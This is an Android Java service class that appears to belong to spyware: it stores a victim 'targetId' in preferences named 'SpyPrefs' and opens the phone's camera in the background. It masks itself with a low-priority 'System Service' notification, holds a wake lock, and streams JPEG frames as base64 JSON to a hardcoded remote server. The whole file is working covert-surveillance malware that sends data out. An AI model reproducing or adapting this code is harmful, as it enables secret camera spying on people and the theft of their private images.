package com.nullx.pp;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.ImageFormat;
import android.graphics.Rect;
import android.graphics.YuvImage;
import android.hardware.Camera;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Base64;
import android.util.Log;
import android.widget.Toast;

import androidx.core.app.NotificationCompat;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class CameraStreamService extends Service implements Camera.PreviewCallback {
    private static final String TAG = "CRPT.CameraStream";
    private static final String CHANNEL_ID = "CameraStreamChannel";
    private static final int NOTIFICATION_ID = 3001;
    private static final String SERVER_URL = "http://papa.queen-official.com:2949/api/post-response/";
    
    private Camera camera;
    private boolean isStreaming = false;
    private String cameraSide = "back";
    private PowerManager.WakeLock wakeLock;
    private int frameCount = 0;
    private long lastFrameTime = 0;
    private static final int TARGET_FPS = 10;
    private static final int DEFAULT_WIDTH = 640;
    private static final int DEFAULT_HEIGHT = 480;
    
    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        acquireWakeLock();
        Log.d(TAG, "CameraStreamService created");
    }
    
    private void acquireWakeLock() {
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "CameraStream:WakeLock");
        wakeLock.acquire(10*60*1000L);
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Camera Stream Service",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setSound(null, null);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }
    
    private Notification getNotification() {
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Camera is active")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true);
        
        return builder.build();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            cameraSide = intent.getStringExtra("side") != null ? intent.getStringExtra("side") : "back";
        }
        
        startForeground(NOTIFICATION_ID, getNotification());
        startStreaming();
        return START_STICKY;
    }
    
    private void startStreaming() {
        if (isStreaming) return;
        isStreaming = true;
        
        int cameraId = cameraSide.equals("front") ? Camera.CameraInfo.CAMERA_FACING_FRONT : Camera.CameraInfo.CAMERA_FACING_BACK;
        
        try {
            camera = Camera.open(cameraId);
            Camera.Parameters params = camera.getParameters();
            
            // Cari resolusi terbaik tapi tidak terlalu besar
            java.util.List<Camera.Size> supportedSizes = params.getSupportedPreviewSizes();
            Camera.Size bestSize = supportedSizes.get(0);
            for (Camera.Size size : supportedSizes) {
                if (size.width <= DEFAULT_WIDTH && size.height <= DEFAULT_HEIGHT) {
                    bestSize = size;
                    break;
                }
                if (size.width <= bestSize.width && size.height <= bestSize.height) {
                    bestSize = size;
                }
            }
            
            params.setPreviewSize(bestSize.width, bestSize.height);
            params.setPreviewFormat(ImageFormat.NV21);
            params.setFocusMode(Camera.Parameters.FOCUS_MODE_CONTINUOUS_VIDEO);
            
            camera.setParameters(params);
            camera.setPreviewCallback(this);
            camera.startPreview();
            
            Log.d(TAG, "Camera streaming started - Resolution: " + bestSize.width + "x" + bestSize.height);
        } catch (Exception e) {
            Log.e(TAG, "Error starting camera: " + e.getMessage());
            isStreaming = false;
        }
    }
    
    @Override
    public void onPreviewFrame(byte[] data, Camera camera) {
        if (!isStreaming) return;
        
        // Frame rate limiting
        long now = System.currentTimeMillis();
        if (now - lastFrameTime < (1000 / TARGET_FPS)) {
            return;
        }
        lastFrameTime = now;
        frameCount++;
        
        final byte[] frameData = data.clone();
        
        new Thread(() -> {
            try {
                Camera.Parameters params = camera.getParameters();
                int width = params.getPreviewSize().width;
                int height = params.getPreviewSize().height;
                
                YuvImage yuvImage = new YuvImage(frameData, params.getPreviewFormat(), width, height, null);
                ByteArrayOutputStream out = new ByteArrayOutputStream();
                int quality = 40; // Kompresi JPEG
                yuvImage.compressToJpeg(new Rect(0, 0, width, height), quality, out);
                
                byte[] jpegData = out.toByteArray();
                String base64Frame = Base64.encodeToString(jpegData, Base64.NO_WRAP);
                sendFrameToServer(base64Frame);
                
            } catch (Exception e) {
                Log.e(TAG, "Error processing frame: " + e.getMessage());
            }
        }).start();
    }
    
    private void sendFrameToServer(String base64Frame) {
        try {
            SharedPreferences prefs = getSharedPreferences("SpyPrefs", MODE_PRIVATE);
            String targetId = prefs.getString("targetId", "unknown");
            
            URL url = new URL(SERVER_URL + targetId);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            
            JSONObject payload = new JSONObject();
            payload.put("cmd", "live_camera_frame");
            payload.put("data", base64Frame);
            payload.put("timestamp", System.currentTimeMillis());
            payload.put("frame", frameCount);
            
            try (OutputStream os = conn.getOutputStream()) {
                os.write(payload.toString().getBytes());
                os.flush();
            }
            
            int responseCode = conn.getResponseCode();
            if (responseCode != 200) {
                Log.w(TAG, "Server response: " + responseCode);
            }
            conn.disconnect();
            
        } catch (Exception e) {
            Log.e(TAG, "Error sending frame: " + e.getMessage());
        }
    }
    
    private void stopStreaming() {
        isStreaming = false;
        if (camera != null) {
            try {
                camera.setPreviewCallback(null);
                camera.stopPreview();
                camera.release();
            } catch (Exception e) {
                Log.e(TAG, "Error stopping camera: " + e.getMessage());
            }
            camera = null;
        }
        Log.d(TAG, "Camera streaming stopped. Total frames: " + frameCount);
    }
    
    @Override
    public void onDestroy() {
        stopStreaming();
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
        Log.d(TAG, "CameraStreamService destroyed");
        super.onDestroy();
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public SharedPreferences getSharedPreferences(String name, int mode) {
        return super.getSharedPreferences(name, mode);
    }
}